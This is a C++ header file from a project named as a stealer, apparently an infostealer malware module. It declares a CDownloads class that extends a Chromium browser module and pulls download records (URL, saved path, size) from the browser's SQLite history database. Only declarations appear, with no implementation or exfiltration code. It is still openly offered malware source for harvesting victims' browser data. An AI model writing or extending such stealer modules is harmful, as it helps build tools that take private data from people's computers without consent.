//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CDOWNLOADS_H
#define STEALER_CDOWNLOADS_H


#include "sqlite3.h"
#include "../ChromiumBrowserModule.h"

struct Download {
    std::string url;
    std::string saved_as;
    long long total_bytes;
};

class CDownloads : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
private:
    static std::list<Download> getDownloads(const fs::path &db_path);
};


#endif //STEALER_CDOWNLOADS_H
